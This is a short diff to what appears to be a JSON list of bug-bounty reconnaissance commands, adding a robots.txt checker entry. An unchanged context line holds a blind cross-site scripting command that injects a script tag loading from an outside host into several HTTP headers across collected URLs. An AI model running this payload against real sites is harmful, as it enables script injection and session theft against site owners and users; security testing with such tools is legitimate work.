@@ -217,5 +217,12 @@
         "commands": [
             "cat all_urls.txt | gf xss| uro | bxss -p '&lt;script src=https://xss.report/c/aceos&gt;&lt;/script&gt;' -H 'Referer' -header 'Origin' -H 'X-Forwarded-For' -H 'User-Agent'"
         ]
+    },
+    {
+        "title": "CHECKS FOR URLS IN ROBOTS.TXT",
+        "subtitle": "Checks while domains have robots.txt file which is accessible",
+        "commands": [
+            "python ~/aceos-tools/robots_checker.py hosts_alive.txt"
+        ]
     }
 ]
